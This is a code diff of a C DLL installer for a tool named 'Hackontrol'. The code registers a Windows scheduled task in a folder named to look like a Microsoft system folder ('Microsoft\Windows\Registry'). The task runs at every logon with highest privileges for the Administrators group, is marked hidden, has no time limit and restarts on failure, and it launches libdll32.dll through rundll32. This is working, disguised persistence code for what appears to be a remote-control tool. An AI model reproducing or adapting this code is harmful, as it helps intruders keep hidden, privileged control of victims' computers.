@@ -1,331 +1,290 @@
-#include "errorLog.h"
+#include <khopanwin32.h>
+#include <khopanstring.h>
 #include <taskschd.h>
 
-#define TASK_FOLDER_NAME L"Microsoft\\Windows\\Registry"
-#define RUNDLL32PATH L"System32\\rundll32.exe"
+#define FREE(x) if(LocalFree(x)) KHWin32DialogErrorW(GetLastError(), L"LocalFree")
 
-#define TASK_NAME L"Startup"
-
-#define FILE_NAME L"libdll32.dll"
-#define FUNCTION_NAME L"Execute"
+#define FILE_LIBDLL32     L"libdll32.dll"
+#define FILE_RUNDLL32     L"rundll32.exe"
+#define FOLDER_SYSTEM32   L"System32"
+#define FUNCTION_LIBDLL32 L"Execute"
+#define TASK_FILE         L"Startup"
+#define TASK_FOLDER       L"Microsoft\\Windows\\Registry"
 
 __declspec(dllexport) void __stdcall Install(HWND window, HINSTANCE instance, LPSTR argument, int command) {
 	HRESULT result = CoInitializeEx(NULL, COINIT_MULTITHREADED);
 
 	if(FAILED(result)) {
-		dialogError(result, L"CoInitializeEx");
+		KHWin32DialogErrorW(result, L"CoInitializeEx");
 		return;
 	}
 
 	result = CoInitializeSecurity(NULL, -1, NULL, NULL, RPC_C_AUTHN_LEVEL_PKT_PRIVACY, RPC_C_IMP_LEVEL_IMPERSONATE, NULL, 0, NULL);
 
 	if(FAILED(result)) {
-		dialogError(result, L"CoInitializeSecurity");
-		goto uninitializeExit;
+		KHWin32DialogErrorW(result, L"CoInitializeSecurity");
+		goto uninitialize;
 	}
 
-	ITaskService* taskService = NULL;
+	ITaskService* taskService;
 	result = CoCreateInstance(&CLSID_TaskScheduler, NULL, CLSCTX_INPROC_SERVER, &IID_ITaskService, &taskService);
 
 	if(FAILED(result)) {
-		dialogError(result, L"CoCreateInstance");
-		goto uninitializeExit;
+		KHWin32DialogErrorW(result, L"CoCreateInstance");
+		goto uninitialize;
 	}
 
 	VARIANT emptyVariant = {VT_EMPTY};
 	result = taskService->lpVtbl->Connect(taskService, emptyVariant, emptyVariant, emptyVariant, emptyVariant);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskService::Connect");
-		goto releaseTaskService;
+		KHWin32DialogErrorW(result, L"ITaskService::Connect");
+		taskService->lpVtbl->Release(taskService);
+		goto uninitialize;
 	}
 
-	ITaskFolder* rootFolder = NULL;
+	ITaskFolder* rootFolder;
 	result = taskService->lpVtbl->GetFolder(taskService, L"\\", &rootFolder);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskService::GetFolder");
-		goto releaseTaskService;
+		KHWin32DialogErrorW(result, L"ITaskService::GetFolder");
+		taskService->lpVtbl->Release(taskService);
+		goto uninitialize;
 	}
 
-	ITaskFolder* taskFolder = NULL;
-	result = rootFolder->lpVtbl->CreateFolder(rootFolder, TASK_FOLDER_NAME, emptyVariant, &taskFolder);
+	ITaskFolder* taskFolder;
+	result = rootFolder->lpVtbl->CreateFolder(rootFolder, TASK_FOLDER, emptyVariant, &taskFolder);
 
 	if(result == 0x800700B7) {
-		result = rootFolder->lpVtbl->GetFolder(rootFolder, TASK_FOLDER_NAME, &taskFolder);
+		result = rootFolder->lpVtbl->GetFolder(rootFolder, TASK_FOLDER, &taskFolder);
 		rootFolder->lpVtbl->Release(rootFolder);
 
 		if(FAILED(result)) {
-			dialogError(result, L"ITaskFolder::GetFolder");
-			goto releaseTaskService;
+			KHWin32DialogErrorW(result, L"ITaskFolder::GetFolder");
+			taskService->lpVtbl->Release(taskService);
+			goto uninitialize;
 		}
 	} else {
 		rootFolder->lpVtbl->Release(rootFolder);
 
 		if(FAILED(result)) {
-			dialogError(result, L"ITaskFolder::CreateFolder");
-			goto releaseTaskService;
+			KHWin32DialogErrorW(result, L"ITaskFolder::CreateFolder");
+			taskService->lpVtbl->Release(taskService);
+			goto uninitialize;
 		}
 	}
 
-	ITaskDefinition* taskDefinition = NULL;
+	ITaskDefinition* taskDefinition;
 	result = taskService->lpVtbl->NewTask(taskService, 0, &taskDefinition);
+	taskService->lpVtbl->Release(taskService);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskService::NewTask");
+		KHWin32DialogErrorW(result, L"ITaskService::NewTask");
 		goto releaseTaskFolder;
 	}
 	
-	IPrincipal* principal = NULL;
+	IPrincipal* principal;
 	result = taskDefinition->lpVtbl->get_Principal(taskDefinition, &principal);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskDefinition::get_Principal");
+		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Principal");
 		goto releaseTaskDefinition;
 	}
 
 	result = principal->lpVtbl->put_RunLevel(principal, TASK_RUNLEVEL_HIGHEST);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IPrincipal::put_RunLevel");
+		KHWin32DialogErrorW(result, L"IPrincipal::put_RunLevel");
 		principal->lpVtbl->Release(principal);
 		goto releaseTaskDefinition;
 	}
 
 	result = principal->lpVtbl->put_UserId(principal, L"S-1-5-32-544");
+	principal->lpVtbl->Release(principal);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IPrincipal::put_UserId");
-		principal->lpVtbl->Release(principal);
+		KHWin32DialogErrorW(result, L"IPrincipal::put_UserId");
 		goto releaseTaskDefinition;
 	}
 
-	principal->lpVtbl->Release(principal);
-	ITriggerCollection* triggerCollection = NULL;
+	ITriggerCollection* triggerCollection;
 	result = taskDefinition->lpVtbl->get_Triggers(taskDefinition, &triggerCollection);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskDefinition::get_Triggers");
+		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Triggers");
 		goto releaseTaskDefinition;
 	}
 
-	ITrigger* trigger = NULL;
+	ITrigger* trigger;
 	result = triggerCollection->lpVtbl->Create(triggerCollection, TASK_TRIGGER_LOGON, &trigger);
 	triggerCollection->lpVtbl->Release(triggerCollection);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITriggerCollection::Create");
+		KHWin32DialogErrorW(result, L"ITriggerCollection::Create");
 		goto releaseTaskDefinition;
 	}
 
 	trigger->lpVtbl->Release(trigger);
-	UINT directoryLength = GetWindowsDirectoryW(NULL, 0);
-
-	if(!directoryLength) {
-		dialogError(GetLastError(), L"GetWindowsDirectoryW");
-		goto releaseTaskDefinition;
-	}
-
-	wchar_t* windowsBuffer = malloc(directoryLength * sizeof(wchar_t));
-
-	if(!windowsBuffer) {
-		dialogError(ERROR_OUTOFMEMORY, L"malloc");
-		goto releaseTaskDefinition;
-	}
-
-	directoryLength = GetWindowsDirectoryW(windowsBuffer, directoryLength);
-
-	if(!directoryLength) {
-		dialogError(GetLastError(), L"GetWindowsDirectoryW");
-		free(windowsBuffer);
-		goto releaseTaskDefinition;
-	}
-
-	size_t fileNameLength = wcslen(RUNDLL32PATH);
-	int notEndWithBackslash = windowsBuffer[directoryLength - 1] != L'\\';
-	size_t rundll32PathBufferSize = directoryLength + fileNameLength + notEndWithBackslash + 1;
-	wchar_t* rundll32PathBuffer = malloc(rundll32PathBufferSize * sizeof(wchar_t));
-
-	if(!rundll32PathBuffer) {
-		dialogError(ERROR_OUTOFMEMORY, L"malloc");
-		free(windowsBuffer);
-		goto releaseTaskDefinition;
-	}
-
-	for(size_t i = 0; i < directoryLength; i++) {
-		rundll32PathBuffer[i] = windowsBuffer[i];
-	}
-
-	free(windowsBuffer);
-
-	if(notEndWithBackslash) {
-		rundll32PathBuffer[directoryLength] = L'\\';
-	}
-
-	for(size_t i = 0; i < fileNameLength; i++) {
-		rundll32PathBuffer[i + directoryLength + notEndWithBackslash] = RUNDLL32PATH[i];
-	}
-
-	rundll32PathBuffer[rundll32PathBufferSize - 1] = 0;
-	fileNameLength = wcslen(FILE_NAME);
-	size_t functionNameLength = wcslen(FUNCTION_NAME);
-	size_t functionBufferSize = fileNameLength + 1 + functionNameLength + 1;
-	wchar_t* functionBuffer = malloc(functionBufferSize * sizeof(wchar_t));
-
-	if(!functionBuffer) {
-		dialogError(ERROR_OUTOFMEMORY, L"malloc");
-		goto freeRundll32PathBuffer;
-	}
-
-	for(size_t i = 0; i < fileNameLength; i++) {
-		functionBuffer[i] = FILE_NAME[i];
-	}
-	
-	functionBuffer[fileNameLength] = L',';
-
-	for(size_t i = 0; i < functionNameLength; i++) {
-		functionBuffer[i + fileNameLength + 1] = FUNCTION_NAME[i];
-	}
-
-	functionBuffer[functionBufferSize - 1] = 0;
-	IActionCollection* actionCollection = NULL;
+	IActionCollection* actionCollection;
 	result = taskDefinition->lpVtbl->get_Actions(taskDefinition, &actionCollection);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskDefinition::get_Actions");
-		goto freeFunctionBuffer;
+		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Actions");
+		goto releaseTaskDefinition;
 	}
 
-	IAction* action = NULL;
+	IAction* action;
 	result = actionCollection->lpVtbl->Create(actionCollection, TASK_ACTION_EXEC, &action);
 	actionCollection->lpVtbl->Release(actionCollection);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IActionCollection::Create");
-		goto freeFunctionBuffer;
+		KHWin32DialogErrorW(result, L"IActionCollection::Create");
+		goto releaseTaskDefinition;
 	}
 
-	IExecAction* executeAction = NULL;
+	IExecAction* executeAction;
 	result = action->lpVtbl->QueryInterface(action, &IID_IExecAction, &executeAction);
 	action->lpVtbl->Release(action);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IAction::QueryInterface");
-		goto freeFunctionBuffer;
+		KHWin32DialogErrorW(result, L"IAction::QueryInterface");
+		goto releaseTaskDefinition;
 	}
 
-	result = executeAction->lpVtbl->put_Path(executeAction, rundll32PathBuffer);
+	LPWSTR pathFolderWindows = KHWin32GetWindowsDirectoryW();
+
+	if(!pathFolderWindows) {
+		KHWin32ConsoleErrorW(GetLastError(), L"KHWin32GetWindowsDirectoryW");
+		executeAction->lpVtbl->Release(executeAction);
+		goto releaseTaskDefinition;
+	}
+
+	LPWSTR pathFileRundll32 = KHFormatMessageW(L"%ws\\" FOLDER_SYSTEM32 L"\\" FILE_RUNDLL32, pathFolderWindows);
+	FREE(pathFolderWindows);
+
+	if(!pathFileRundll32) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		executeAction->lpVtbl->Release(executeAction);
+		goto releaseTaskDefinition;
+	}
+
+	result = executeAction->lpVtbl->put_Path(executeAction, pathFileRundll32);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IExecAction::put_Path");
+		KHWin32DialogErrorW(result, L"IExecAction::put_Path");
+		FREE(pathFileRundll32);
 		executeAction->lpVtbl->Release(executeAction);
-		goto freeFunctionBuffer;
+		goto releaseTaskDefinition;
 	}
 
-	result = executeAction->lpVtbl->put_Arguments(executeAction, functionBuffer);
+	LPWSTR argumentFileRundll32 = KHFormatMessageW(L"%ws " FILE_LIBDLL32 L"," FUNCTION_LIBDLL32, pathFileRundll32);
+	FREE(pathFileRundll32);
+
+	if(!argumentFileRundll32) {
+		KHWin32DialogErrorW(ERROR_FUNCTION_FAILED, L"KHFormatMessageW");
+		executeAction->lpVtbl->Release(executeAction);
+		goto releaseTaskDefinition;
+	}
+
+	result = executeAction->lpVtbl->put_Arguments(executeAction, argumentFileRundll32);
+	FREE(argumentFileRundll32);
 	executeAction->lpVtbl->Release(executeAction);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IExecAction::put_Arguments");
-		goto freeFunctionBuffer;
+		KHWin32DialogErrorW(result, L"IExecAction::put_Arguments");
+		goto releaseTaskDefinition;
 	}
 	
 	ITaskSettings* taskSettings = NULL;
 	result = taskDefinition->lpVtbl->get_Settings(taskDefinition, &taskSettings);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskDefinition::get_Settings");
-		goto freeFunctionBuffer;
+		KHWin32DialogErrorW(result, L"ITaskDefinition::get_Settings");
+		goto releaseTaskDefinition;
 	}
 
 	result = taskSettings->lpVtbl->put_AllowDemandStart(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_AllowDemandStart");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_AllowDemandStart");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_RestartInterval(taskSettings, L"PT1M");
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_RestartInterval");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_RestartInterval");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_RestartCount(taskSettings, 5);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_RestartCount");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_RestartCount");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_ExecutionTimeLimit(taskSettings, L"PT0M");
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_ExecutionTimeLimit");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_ExecutionTimeLimit");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_DisallowStartIfOnBatteries(taskSettings, VARIANT_FALSE);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_DisallowStartIfOnBatteries");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_StopIfGoingOnBatteries(taskSettings, VARIANT_FALSE);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_StopIfGoingOnBatteries");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_RunOnlyIfNetworkAvailable(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_RunOnlyIfNetworkAvailable");
 		goto releaseTaskSettings;
 	}
 
 	result = taskSettings->lpVtbl->put_Hidden(taskSettings, VARIANT_TRUE);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskSettings::put_Hidden");
+		KHWin32DialogErrorW(result, L"ITaskSettings::put_Hidden");
 		goto releaseTaskSettings;
 	}
 	
-	taskFolder->lpVtbl->DeleteTask(taskFolder, TASK_NAME, 0);
-	IRegisteredTask* task = NULL;
-	result = taskFolder->lpVtbl->RegisterTaskDefinition(taskFolder, TASK_NAME, taskDefinition, TASK_CREATE_OR_UPDATE, emptyVariant, emptyVariant, TASK_LOGON_GROUP, emptyVariant, &task);
+	taskFolder->lpVtbl->DeleteTask(taskFolder, TASK_FILE, 0);
+	IRegisteredTask* registeredTask;
+	result = taskFolder->lpVtbl->RegisterTaskDefinition(taskFolder, TASK_FILE, taskDefinition, TASK_CREATE_OR_UPDATE, emptyVariant, emptyVariant, TASK_LOGON_GROUP, emptyVariant, &registeredTask);
 
 	if(FAILED(result)) {
-		dialogError(result, L"ITaskFolder::RegisterTaskDefinition");
+		KHWin32DialogErrorW(result, L"ITaskFolder::RegisterTaskDefinition");
 		goto releaseTaskSettings;
 	}
 
-	MessageBoxW(NULL, L"Hackontrol successfully installed on your machine", L"Hackontrol Installer", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
-	IRunningTask* runningTask = NULL;
-	result = task->lpVtbl->Run(task, emptyVariant, &runningTask);
-	task->lpVtbl->Release(task);
+	MessageBoxW(NULL, L"Hackontrol successfully installed on your machine!", L"Hackontrol Installer", MB_OK | MB_ICONINFORMATION | MB_DEFBUTTON1 | MB_SYSTEMMODAL);
+	IRunningTask* runningTask;
+	result = registeredTask->lpVtbl->Run(registeredTask, emptyVariant, &runningTask);
+	registeredTask->lpVtbl->Release(registeredTask);
 
 	if(FAILED(result)) {
-		dialogError(result, L"IRegisteredTask::Run");
+		KHWin32DialogErrorW(result, L"IRegisteredTask::Run");
 		goto releaseTaskSettings;
 	}
 
 	runningTask->lpVtbl->Release(runningTask);
 releaseTaskSettings:
 	taskSettings->lpVtbl->Release(taskSettings);
-freeFunctionBuffer:
-	free(functionBuffer);
-freeRundll32PathBuffer:
-	free(rundll32PathBuffer);
 releaseTaskDefinition:
 	taskDefinition->lpVtbl->Release(taskDefinition);
 releaseTaskFolder:
 	taskFolder->lpVtbl->Release(taskFolder);
-releaseTaskService:
-	taskService->lpVtbl->Release(taskService);
-uninitializeExit:
+uninitialize:
 	CoUninitialize();
 }
